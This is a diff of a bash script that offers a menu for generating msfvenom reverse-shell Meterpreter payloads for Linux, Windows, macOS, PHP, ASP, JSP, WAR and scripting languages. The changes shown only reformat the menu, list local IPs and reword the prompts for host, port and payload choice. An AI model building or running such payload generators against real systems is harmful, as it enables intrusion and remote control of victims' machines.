@@ -5,14 +5,16 @@ echo "
                /                                    "
 
 echo -e "MSFVENOM Reverse Shell Meterpreter Payload List"
-printf "1. Linux .elf (Meterpreter)\n2.Windows .exe (Meterpreter)\n3.MAC .macho OS\n4.PHP (Meterpreter)\n5.ASP (Meterpreter)\n6.JSP\n7.WAR\n8.Python\n9.Bash .sh\n10.Perl\n11.ASPX (Meterpreter)\n\n"
-echo -e "Enter Local Host IP Address:"
+printf "1. Linux .elf (Meterpreter)\t2.Windows .exe (Meterpreter)\n3.MAC .macho OS\t\t\t4.PHP (Meterpreter)\n5.ASP (Meterpreter)\t\t6.JSP\n7.WAR\t\t\t\t8.Python\n9.Bash .sh\t\t\t10.Perl\n11.ASPX (Meterpreter)\n\n"
+echo -e "Local IP addresses =>"
+ip -o addr show scope global | cut -d " " -f2,7
+echo -e "\nEnter Local Host IP Address:"
 read lhost
 echo -e "Enter Local Host Port:"
 read lport
 echo -e "Enter Payload Number:"
 read num
-echo $num
+echo "Payload selected = "$num
 echo "Enter Shell Name(without extension):"
 read shname
 if [ $num == 1 ] 
